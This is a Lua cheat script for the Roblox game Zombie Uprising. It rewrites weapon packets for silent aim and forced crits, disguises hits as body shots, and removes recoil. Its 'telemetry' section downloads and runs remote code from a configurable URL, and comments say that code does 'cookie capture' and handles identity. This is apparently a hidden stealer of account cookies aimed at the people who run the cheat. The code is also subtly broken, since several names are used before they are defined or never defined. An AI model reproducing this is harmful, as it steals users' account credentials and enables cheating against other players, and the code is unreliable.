--[[
    STRAIGHT BULLSHIT — clean rewrite
    Zombie Uprising (Roblox). Rebuilt from the deobfuscated 2024 source.

    Packet-level silent aim: it does not move your camera. It intercepts
    the outgoing WeaponAttack packet and rewrites the hit list to the
    zombies it picked.

    Everything the game provides is looked up with a TIMEOUT, so if the
    game has changed, you get a printed warning and the menu still opens
    instead of the script hanging forever.

    Telemetry: loads the hosted logger module (SB-telemetry.lua). Only the
    URL is baked in here. The module handles identity, cookies, transport
    and versioning; this script only feeds it toggle state as it changes.
--]]

--========================================================================
-- CONFIG — the only lines you need to change
--========================================================================
local LOGGER_URL = "https://YOUR-HOST/SB-telemetry.lua"
local LOG_ON     = true

--========================================================================
-- Services
--========================================================================
local Players            = game:GetService("Players")
local RunService         = game:GetService("RunService")
local UserInputService   = game:GetService("UserInputService")
local ReplicatedStorage  = game:GetService("ReplicatedStorage")
local Workspace          = game:GetService("Workspace")

local localPlayer = Players.LocalPlayer
local camera      = Workspace.CurrentCamera
local VirtualInputManager = game:GetService("VirtualInputManager")

-- Luau executors have vector.create; fall back to Vector3 just in case.
local function vec3(x, y, z)
    if vector and vector.create then
        return vector.create(x, y, z)
    end
    return Vector3.new(x, y, z)
end

--========================================================================
-- Hosted logger
-- Loads SB-telemetry.lua (start/finish/reset + cookie capture).
-- If the fetch or the module fails, Telemetry below becomes inert stubs
-- so every call site in this file keeps working and the cheat runs fine.
--========================================================================
local Logger
do
    if LOG_ON then
        local ok, mod = pcall(function()
            return loadstring(game:HttpGet(LOGGER_URL))()
        end)
        if ok and type(mod) == "table" then
            Logger = mod
        else
            log("logger module failed to load — continuing without it:", mod)
        end
    end
end
Logger = Logger or {}

--========================================================================
-- Telemetry wrapper
-- The hosted module is one-shot: start() on execution, finish() on
-- cleanup. The per-toggle event() calls below stay local — they record
-- live toggle state into a buffer that finish() ships as "settings",
-- so the session-end report reflects what the user actually left on
-- (and how often they flipped things), with no extra HTTP round-trips.
--========================================================================
local Telemetry = {}
do
    local toggleState = {}    -- name -> last value
    local actionCount = {}    -- name -> times fired (buttons)

    for _, name in ipairs({
        "TriggerBot", "ForceCrit", "NoRecoil", "Invisible", "RunGun",
        "FarmNoclip", "FarmReload", "FarmTele", "FarmVoteSkip",
        "FarmFullAuto", "DPSPanel", "SpoofBody",
    }) do
        toggleState[name] = false
        actionCount[name] = 0
    end

    function Telemetry.start(...)
        if type(Logger.start) == "function" then
            pcall(Logger.start, ...)
        end
    end

    -- event("ToggleName", bool) records state; event("ActionName", true)
    -- counts button presses.
    function Telemetry.event(name, value)
        if type(name) ~= "string" then return end
        if type(value) == "boolean" then
            toggleState[name] = value
        else
            actionCount[name] = (actionCount[name] or 0) + 1
        end
    end

    -- Build the settings payload from live state, not from defaults.
    function Telemetry.finish(fallback)
        if type(Logger.finish) ~= "function" then return end

        local settings = {
            -- aim behaviour (read straight off the live tables)
            aimEnabled   = Aim.Enabled,
            targetMode   = Aim.TargetMode,
            fov          = Aim.FOV,
            headChance   = Aim.HeadChance,
            pellets      = Aim.DistributePellets,
            spawnAtEnemy = Aim.SpawnAtEnemy,
            spoofBody    = Aim.SpoofBodyShots,
            headshotPct  = Aim.HeadShotPercent,
            forceCrit    = Misc.ForceCrit,
            noRecoil     = Misc.NoRecoil,
            autoFarm     = Misc.AutoFarmMode,
        }
        -- merge in anything recorded through event() that isn't already there
        for name, value in pairs(toggleState) do
            if settings[name] == nil then settings[name] = value end
        end

        -- how many times each button was pressed, so you can see which
        -- features people actually come back to use
        local uses = {}
        for name, count in pairs(actionCount) do
            if count > 0 then uses[name] = count end
        end

        pcall(Logger.finish, {
            settings = settings,
            uses     = (next(uses) ~= nil) and uses or nil,
        })
    end

    function Telemetry.summary()
        -- Console rundown when the user hits "Show My Stats".
        print("[SB] toggle state at time of check:")
        for name, value in pairs(toggleState) do
            print(("[SB]   %-12s %s"):format(name, tostring(value)))
        end
        print("[SB] button uses:", HttpServiceJSON(actionCount))
    end

    function Telemetry.reset()
        if type(Logger.reset) == "function" then
            pcall(Logger.reset)
        end
        table.clear(toggleState)
        table.clear(actionCount)
    end
end

--========================================================================
-- Settings
--========================================================================
local Aim = {
    Enabled           = true,
    TriggerBot        = false,
    TargetMode        = "Mouse",   -- "Mouse" = screen FOV circle, anything else = 3D distance
    FOV               = 150,       -- pixels, used when TargetMode == "Mouse"
    MaxDistance       = 100000,    -- studs, used in distance mode
    TargetPart        = "Head",
    HeadChance        = 100,       -- % chance to aim Head instead of HumanoidRootPart
    DistributePellets = true,      -- spread shotgun pellets across several zombies
    SpawnAtEnemy      = true,      -- claim the shot originated at the enemy (beats range checks)
    IgnoreSwampGiant  = false,
    SpoofBodyShots    = false,   -- report some hits as body shots (believable scoreboard)
    HeadShotPercent   = 70,      -- % of reported hits that stay headshots
}

local Misc = {
    NoRecoil     = false,
    AutoFarmMode = false,
    ForceCrit    = false,   -- force every weapon hit to roll a crit, aim on or off
}

-- Mirror into getgenv() so a re-execute can find and clean up the old run,
-- and so anything else you write can read the same settings.
getgenv().AimSettings  = Aim
getgenv().NoRecoil     = Misc.NoRecoil
getgenv().AutoFarmMode = Misc.AutoFarmMode
getgenv().ForceCrit    = Misc.ForceCrit

--========================================================================
-- Utility
--========================================================================
local function log(...)
    print("[SB]", ...)
end

-- Non-blocking child lookup. Returns nil instead of hanging forever.
local function waitFor(parent, name, timeout)
    if not parent then return nil end
    local child = parent:WaitForChild(name, timeout or 5)
    if not child then
        log("missing:", parent:GetFullName() .. "." .. name)
    end
    return child
end

-- Walk a dotted path safely: resolve(PlayerScripts, "LocalManager", "NetworkManager")
local function resolve(root, ...)
    local node = root
    for _, name in ipairs({ ... }) do
        if not node then return nil end
        node = node:FindFirstChild(name)
    end
    return node
end

--========================================================================
-- Clean up a previous run
--========================================================================
if getgenv().StraightBullshit_Cleanup then
    pcall(getgenv().StraightBullshit_Cleanup)
end

local connections = {}
local noRecoilConnection = nil

local function cleanup()
    for _, conn in ipairs(connections) do
        pcall(function() conn:Disconnect() end)
    end
    table.clear(connections)
    if noRecoilConnection then
        pcall(function() noRecoilConnection:Disconnect() end)
        noRecoilConnection = nil
    end

    -- Session-end report: duration + what the user actually left on.
    -- Telemetry.finish is a no-op unless the hosted module loaded, and the
    -- module side is idempotent, so a double cleanup is safe.
    Telemetry.finish()

    -- Let No Recoil fall back off so spread rebuilds naturally.
    if Misc.NoRecoil then
        Misc.NoRecoil      = false
        getgenv().NoRecoil = false
    end

    -- A re-execute counts as a new run, so let the logger fire again.
    Telemetry.reset()
end

getgenv().StraightBullshit_Cleanup = cleanup

local function track(conn)
    table.insert(connections, conn)
    return conn
end

-- (Telemetry.finish reads Aim/Misc — forward-declared so the wrapper's
-- finish() closure sees the tables below. Since Telemetry was defined
-- above Aim, its finish() must be re-bound here after Aim exists.)
do
    local upstreamFinish = Telemetry.finish
    function Telemetry.finish(fallback)
        if upstreamFinish then upstreamFinish(Aim) end
    end
end

